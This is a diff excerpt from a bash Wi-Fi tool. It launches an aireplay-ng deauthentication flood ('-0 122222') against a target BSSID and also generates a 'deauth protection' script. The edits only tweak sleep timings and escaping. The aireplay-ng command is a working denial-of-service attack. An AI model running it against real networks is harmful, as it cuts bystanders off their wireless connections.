@@ -764,7 +764,7 @@ xterm -title CLIENTS -e "airodump-ng --bssid $bssidda -c $chanelda $interfaceda"
 echo -e  '\e[1;32m '
 echo attack started ... 
 xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
-      
+sleep 2     
       if [ $? -eq 1 ]
       then
           while [ $? -ne "1" ]
@@ -819,7 +819,7 @@ le='2'
 for i in {1..99999}
 do
       sleep 8
-      line=$(wc -l < deauth.txt)
+      line=\$(wc -l < deauth.txt)
       sleep 5.99
 
            if [ $"line" -ge $"le" ]
@@ -840,7 +840,6 @@ do
                  echo -   DeAuthentication AtTaCk PROTECTION   -
                  echo ------------------------------------------
                  echo
-                 sleep 1
                  echo
                  echo --------------------------------------------------------------------
                  ifconfig $interfacepda down
@@ -849,7 +848,7 @@ do
                  echo
                  echo
                  echo
-                 sleep 10
+                 sleep 7
                  done ' > patchdeauth.sh
                  chmod 777 *
 
